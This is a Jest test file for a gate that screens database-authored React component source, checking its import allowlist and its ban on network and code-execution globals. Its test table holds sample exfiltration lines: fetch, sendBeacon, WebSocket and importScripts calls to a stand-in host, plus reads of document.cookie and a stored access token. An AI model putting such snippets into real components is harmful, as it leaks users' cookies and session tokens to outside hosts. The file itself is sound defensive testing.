/**
 * Forcing tests for THE ONE write-time gate on DB-authored component source.
 *
 * The first test is the anti-drift guard: the JSON the Python twin compares
 * itself against must BE the in-page compiler's own allowlist. Add a module to
 * `ALLOWED_IMPORTS_CONFIG` without adding it here and this test goes red — which
 * is the point, because the aidream parity test compares against this JSON.
 */

import gate from "./component-source-gate.json";
import { getAllowedImportsList } from "./allowed-imports";
import {
  COMPONENT_ALLOWED_IMPORTS,
  componentGlobalsLint,
  componentImportLint,
  componentSourceGate,
} from "./component-source-gate";

const LEGITIMATE_COMPONENT = `
import React, { useState } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Sparkle } from "lucide-react";

export default function ReadingList({ data }) {
  const [open, setOpen] = useState(false);
  return (
    <Card>
      <CardContent onClick={() => setOpen(!open)}>
        {data?.title ?? "Untitled"}
      </CardContent>
    </Card>
  );
}
`;

describe("component-source-gate lists", () => {
  it("publishes EXACTLY the in-page compiler's allowlist, sorted", () => {
    expect(gate.allowedImports).toEqual([...getAllowedImportsList()].sort());
    expect(COMPONENT_ALLOWED_IMPORTS).toEqual(gate.allowedImports);
  });

  it("keeps every list sorted and duplicate-free so byte comparison is meaningful", () => {
    for (const [name, list] of Object.entries({
      allowedImports: gate.allowedImports,
      bannedGlobals: gate.bannedGlobals,
      bannedCallables: gate.bannedCallables,
      bannedMemberAccess: gate.bannedMemberAccess,
    })) {
      expect(`${name}:${JSON.stringify(list)}`).toEqual(
        `${name}:${JSON.stringify([...new Set(list)].sort())}`,
      );
    }
  });
});

describe("componentImportLint", () => {
  it("passes a component that imports only allowlisted modules", () => {
    expect(componentImportLint(LEGITIMATE_COMPONENT)).toBeNull();
  });

  it("refuses an unknown module and names it", () => {
    const refusal = componentImportLint(
      `import axios from "axios";\nexport default function C({ data }) { return null; }`,
    );
    expect(refusal).toContain("axios");
    expect(refusal).toMatch(/^This component/);
  });

  it("refuses a dynamic import()", () => {
    const refusal = componentImportLint(
      `export default function C({ data }) { import("node:fs"); return null; }`,
    );
    expect(refusal).toContain("dynamic import()");
  });
});

describe("componentGlobalsLint — the exfiltration class", () => {
  it("passes a legitimate component", () => {
    expect(componentGlobalsLint(LEGITIMATE_COMPONENT)).toBeNull();
  });

  it.each([
    ["bare fetch", `fetch("https://evil.example/collect", { method: "POST" })`],
    ["window.fetch", `window.fetch("https://evil.example/collect")`],
    ["globalThis.fetch", `globalThis["x"]; globalThis.fetch("https://evil.example")`],
    ["XMLHttpRequest", `const x = new XMLHttpRequest();`],
    ["WebSocket", `const s = new WebSocket("wss://evil.example");`],
    ["EventSource", `const e = new EventSource("https://evil.example");`],
    ["sendBeacon", `navigator.sendBeacon("https://evil.example", body);`],
    ["document.cookie", `const c = document.cookie;`],
    ["eval", `eval("1 + 1");`],
    ["new Function", `const f = new Function("return 1");`],
    ["importScripts", `importScripts("https://evil.example/x.js");`],
    ["localStorage", `const t = localStorage.getItem("sb-access-token");`],
    ["sessionStorage", `const t = sessionStorage.getItem("sb-access-token");`],
  ])("refuses %s", (_label, snippet) => {
    const refusal = componentGlobalsLint(
      `export default function C({ data }) { ${snippet} return null; }`,
    );
    expect(refusal).toMatch(/^This component uses "/);
  });

  it("does NOT refuse a TypeScript type named with the word Function", () => {
    expect(
      componentGlobalsLint(
        `type AgentFunctionSpec = { purpose?: string };\nlet cb: Function | null = null;\nexport default function C({ data }) { return null; }`,
      ),
    ).toBeNull();
  });

  it("does NOT refuse window.localStorage — two live platform components use it", () => {
    // research_report_card and agent_mandate_specification_workbench persist
    // per-viewer UI state through window.localStorage (verified live
    // 2026-09-11). Browser storage is not an exfiltration channel and banning
    // it outright is a product ruling nobody has made.
    expect(
      componentGlobalsLint(
        `const raw = window.localStorage.getItem(storageKey);`,
      ),
    ).toBeNull();
  });
});

describe("componentSourceGate", () => {
  it("stores a legitimate component", () => {
    expect(componentSourceGate(LEGITIMATE_COMPONENT)).toBeNull();
  });

  it("refuses imports before globals so the author fixes the first problem first", () => {
    const refusal = componentSourceGate(
      `import axios from "axios";\nfetch("https://evil.example");`,
    );
    expect(refusal).toContain("axios");
  });

  it("skips html-flavor bodies, which render in the origin-isolated iframe", () => {
    expect(
      componentSourceGate(`<script>fetch("https://evil.example")</script>`, {
        flavor: "html",
      }),
    ).toBeNull();
    expect(
      componentSourceGate(`<script>fetch("https://evil.example")</script>`),
    ).not.toBeNull();
  });
});
